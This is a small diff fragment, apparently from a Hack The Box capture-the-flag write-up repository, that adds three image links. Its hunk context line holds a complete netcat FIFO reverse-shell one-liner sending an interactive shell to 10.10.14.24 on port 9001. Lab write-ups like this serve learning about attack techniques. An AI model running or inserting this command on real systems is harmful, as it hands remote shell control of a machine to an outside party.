@@ -108,3 +108,7 @@ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.24 9001 >/tmp/f
 
 ---
 
+![image](https://github.com/0xhardyboy/Hack-the-Box/assets/83878909/28989d3b-05b5-4aec-89c7-3b1e78254bb3)
+![image](https://github.com/0xhardyboy/Hack-the-Box/assets/83878909/d46994ef-c6fd-46ab-9f41-51a017a1c1e6)
+![image](https://github.com/0xhardyboy/Hack-the-Box/assets/83878909/ee8359b1-9f96-4aa6-a14c-adf24cc90004)
+
